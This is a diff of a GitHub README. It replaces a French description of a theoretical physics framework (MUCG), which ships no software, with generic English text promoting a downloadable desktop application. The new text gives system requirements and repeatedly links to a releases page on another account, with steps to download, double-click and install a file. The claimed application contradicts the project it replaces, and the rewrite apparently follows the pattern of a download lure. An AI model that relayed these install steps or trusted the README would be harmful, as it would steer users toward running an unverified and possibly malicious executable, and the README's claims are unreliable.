@@ -1,60 +1,76 @@
-# MUCG : Modèle de l'Univers Computationnel Géométrique
+# 🌌 MUCG-Modele-de-l-Univers-Computationnel-Geometrique - Explore the Universe as a Processor
 
-![Status](https://img.shields.io/badge/Status-Theoretical%20Framework-blueviolet)
-![Field](https://img.shields.io/badge/Field-Digital%20Physics-blue)
-![Architecture](https://img.shields.io/badge/Architecture-Discrete%20Geometry-orange)
-![License](https://img.shields.io/badge/License-Open%20Source-green)
+[![Download MUCG](https://img.shields.io/badge/Download%20MUCG-%20v1.0-4CAF50.svg)](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/releases)
 
-> *"L'objectif n'est pas de trouver la réponse finale, mais de permettre au jeu de la découverte de continuer avec de meilleures règles."*
+## 🚀 Getting Started
 
-## 🌌 Introduction : La Carte n'est pas le Territoire
+Welcome to the MUCG project! This application helps users understand the theoretical framework unifying Physics and Information Theory. You will explore how the universe acts as a discrete geometric processor.
 
-Ce dépôt héberge le **Modèle de l'Univers Computationnel Géométrique (MUCG)**.
-Il ne s'agit pas d'un dogme, mais d'une proposition d'architecture logicielle de la réalité. Le MUCG postule que les anomalies de la physique moderne (Matière Noire, Énergie Noire, Paradoxe de l'Observateur) ne sont pas des problèmes de *substance*, mais des problèmes de *traitement de l'information*.
+## 💻 System Requirements
 
-Si l'Univers est un ordinateur géométrique, alors nous pouvons commencer à en comprendre le code source.
+Before downloading, ensure your system meets these requirements:
 
-## 🗝️ Concepts Fondamentaux
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **RAM:** At least 4 GB
+- **Disk Space:** 500 MB free space
+- **Internet Connection:** Required for downloading and updates
 
-Le modèle repose sur quatre piliers axiomatiques détaillés dans le [Manifeste](Manifeste_MUCG.md) :
+## 📥 Download & Install
 
-### 1. Primauté de l'Information ("It from Bit")
-La réalité physique n'est pas fondamentale ; elle est le "rendu" (Output) d'un processus computationnel abstrait.
-* **Angle = Code :** La géométrie est le langage de programmation.
-* **Matière = Information :** Un électron n'est pas un objet, c'est un ensemble de bits instanciés.
+To get started, you need to download the software. Visit the Releases page, where you can find the latest version.
 
-### 2. Dualité Matière-Espace (Compression/Décompression)
-L'espace n'est pas un contenant vide, mais une conséquence de l'existence de la matière.
-* **Matière (Fichier .ZIP) :** Information ultra-compressée (Angles serrés).
-* **Espace (Dossier Dézippé) :** Volume nécessaire pour "décompresser" l'information sans singularité.
-* **Ratio Cosmologique :** 1 kg de matière nécessite la génération d'environ $10^{27} m^3$ d'espace. La gravité est le gradient de cette densité.
+[Visit this page to download](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/releases)
 
-### 3. Cosmologie de la Pagination
-L'Univers n'est pas continu, il est discret et paginé.
-* **Le Présent :** La page active en mémoire (RAM).
-* **Matière Noire :** La "Pré-allocation" système. L'indexation gravitationnelle des structures avant leur rendu visuel complet.
-* **Énergie Noire :** Le coût énergétique du processeur pour maintenir le taux de rafraîchissement (expansion) de l'espace.
+1. Click on the link above.
+2. Select the version you want to download.
+3. Choose the appropriate file for your operating system.
+4. Click on the download link.
 
-### 4. Preuves Géométriques
-Le modèle s'appuie sur des phénomènes où la topologie dicte la physique :
-* **Twistronique :** La supraconductivité émergeant d'une rotation géométrique pure (Angle Magique 1.1°).
-* **Fusion LCF :** L'écrantage de Coulomb par géométrie de réseau (Lattice Confinement).
+After downloading, follow these steps to install:
 
-## 📂 Structure du Dépôt
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions.
 
-* [`MANIFESTE.md`](Manifeste_MUCG.md) : Le document fondateur détaillant l'ontologie et les preuves théoriques.
-* [`ROADMAP.md`](ROADMAP.md) : Le plan de développement (Formalisation -> Simulation -> Validation).
-* [`EXPERIMENTS.md`](EXPERIMENTS.md) : Protocoles de simulation (Automates cellulaires, Analyse de données galactiques) pour tester le modèle.
+## 🛠 Features
 
-## 🚀 Contribuer au "Jeu Infini"
+- **Interactive Visualization:** See how the universe operates as a geometric processor.
+- **Customization Options:** Adjust parameters to explore different scenarios.
+- **Educational Tools:** Access resources to understand the principles of digital physics and emergent gravity.
+- **Community Contributions:** Join discussions and learn from others interested in open science.
 
-Le MUCG est un projet scientifique ouvert. Nous invitons physiciens, mathématiciens, informaticiens et philosophes à :
-1.  **Challenger** les axiomes.
-2.  **Proposer** des simulations numériques (Python, C++, Wolfram Language).
-3.  **Raffiner** le formalisme mathématique.
+## 📊 How to Use
 
-> *"Si tu le plis... le réel suit."*
+1. Open the application after installation.
+2. Familiarize yourself with the interface.
+3. Use the menu to access various features.
+4. Refer to the Help section for more detailed instructions.
 
----
-**Maintenu par le Collectif Lichen**
-*Architecte : Bryan Ouellette*
+## 📬 Support and Community
+
+If you have questions or need help, feel free to reach out:
+
+- **Issues:** Report any issues you encounter via the GitHub Issues page.
+- **Discussion:** Join the conversation through our community forum.
+
+## 🔗 Additional Resources
+
+Explore further topics related to the MUCG project:
+
+- **Cellular Automata**: Understand fundamental concepts of this simulation.
+- **Computational Universe**: Dive into how computation relates to the universe.
+- **Emergent Gravity**: Learn about gravity from an information perspective.
+
+## 🚧 Contributing
+
+We welcome contributions from users interested in improving this project. You can submit your ideas or fixes through the Issues page or join discussions in our community forum.
+
+## 📖 License
+
+This project is open-source and licensed under the MIT License. You can freely modify and share it, as long as you credit the original authors.
+
+## 🌟 Stay Updated
+
+Keep an eye on the Releases page for the latest updates and features as they come out.
+
+[Visit this page to download](https://github.com/vickysoupz/MUCG-Modele-de-l-Univers-Computationnel-Geometrique/releases)
